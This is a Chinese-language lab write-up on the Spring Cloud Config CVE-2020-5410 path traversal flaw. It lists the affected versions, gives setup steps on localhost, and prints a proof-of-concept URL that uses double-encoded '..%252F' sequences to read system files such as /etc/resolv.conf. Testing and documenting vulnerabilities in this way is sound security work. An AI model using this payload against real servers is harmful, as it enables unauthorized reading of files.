# Spring Cloud Config CVE-2020-5410 路径穿越漏洞测试

## 简介

Spring Cloud Config 程序内部在处理客户端传入的资源时存在自动将 (_) 转换为 / 的隐藏转换，当 `profile` 设置为 `native`时，则会导致服务端路径穿越，因此攻击者可以利用此机制来穿越到其它路径，读取任意文件。

## 影响范围

```
Spring Cloud Config 2.2.0 - 2.2.2
Spring Cloud Config 2.1.0 - 2.1.8
```

## 环境搭建

以 2.1.5 版本为例，从官方 Git 仓库下载 `v2.1.5.RELEASE` 版本：

https://github.com/spring-cloud/spring-cloud-config/archive/v2.1.5.RELEASE.zip

将文件解压缩之后，进入解压之后的目录 `spring-cloud-config-2.1.5.RELEASE`，然后执行下面的命令启动 Spring Cloud Config 服务端（注：必须要安装 [maven](https://maven.apache.org/download.cgi)，并且加入 PATH 环境变量）：

```
cd spring-cloud-config-server
../mvnw spring-boot:run
```

项目启动成功后，通过浏览器即可访问。

```
http://127.0.0.1:8888/
```

## 漏洞验证

根据漏洞原理分析，漏洞利用 URL 格式如下：

```
/{name}/{profile}/{label:*}
```

其中 `{name}` 是发生路径穿越的部分，可以通过 `..%252F` 实现路径穿越，文件路径的结尾需要使用 `%23` 截断。

最终，该漏洞的验证 POC 如下：

```
# Linux
/..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fresolv.conf%23/dd

# Windows
/..%252F..%252F..%252F..%252F..%252F..%252F..%252FC:%252Fwindows%252Fsystem.ini%23/dd
# 注：Windows下测试未成功
```

## 参考资料

- https://baijiahao.baidu.com/s?id=1669260253081826022&wfr=spider&for=pc
- https://github.com/jinqi520/pocsuite3_jinqi/blob/6bdfb4d254b1fe9d15718c471d8ebacd2d942644/pocsuite3/pocs/spring_cloud_config_lfr.py
- https://www.defvul.com/

